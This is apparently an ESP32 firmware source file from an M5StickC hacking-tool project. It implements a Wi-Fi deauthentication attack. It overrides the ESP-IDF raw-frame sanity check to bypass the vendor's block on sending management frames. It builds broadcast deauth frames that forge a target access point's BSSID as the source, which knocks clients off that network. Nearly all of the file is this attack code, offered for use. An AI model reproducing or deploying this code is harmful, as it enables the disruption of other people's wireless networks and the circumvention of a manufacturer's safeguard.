


  // Borrowed from https://github.com/justcallmekoko/ESP32Marauder/
  // Learned from https://github.com/risinek/esp32-wifi-penetration-tool/
  // Arduino IDE needs to be tweeked to work, follow the instructions: https://github.com/justcallmekoko/ESP32Marauder/wiki/arduino-ide-setup
  // But change the file in: C:\Users\<YOur User>\AppData\Local\Arduino15\packages\m5stack\hardware\esp32\2.0.9\

  // info on my github: https://github.com/bmorcelli/m5stickC_Plus2-nemo



#if defined(DEAUTHER) 
  #include <WiFi.h>
  #include "esp_wifi.h"
  #include "esp_system.h"


  extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
      if (arg == 31337)
        return 1;
      else
        return 0;
  }
  /**
  * @brief Sends frame in frame_buffer using esp_wifi_80211_tx but bypasses blocking mechanism
  * 
  * @param frame_buffer 
  * @param size size of frame buffer
  */
  void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size);

  /**
  * @brief Sends deauthentication frame with forged source AP from given ap_record
  *  
  * This will send deauthentication frame acting as frame from given AP, and destination will be broadcast
  * MAC address - \c ff:ff:ff:ff:ff:ff
  * 
  * @param ap_record AP record with valid AP information 
  * @param chan Channel of the targetted AP
  */
  void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan);

  static const uint8_t deauth_frame_default[] = {
      0xc0, 0x00, 0x3a, 0x01,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0xf0, 0xff, 0x02, 0x00
  };
  uint8_t deauth_frame[sizeof(deauth_frame_default)];
  /**
  * @brief Decomplied function that overrides original one at compilation time.
  * 
  * @attention This function is not meant to be called!
  * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther

  int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
      return 0;
  }

  */


  void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
      ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
      Serial.println(" -> Sent deauth frame");
  }

  void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan){
      Serial.print("\Preparing deauth frame to -> ");
      for (int j = 0; j < 6; j++) {
        Serial.print(ap_record->bssid[j], HEX);
        if (j < 5) Serial.print(":");
      }
      esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
      delay(50);
      memcpy(&deauth_frame[10], ap_record->bssid, 6);
      memcpy(&deauth_frame[16], ap_record->bssid, 6);
  }


#endif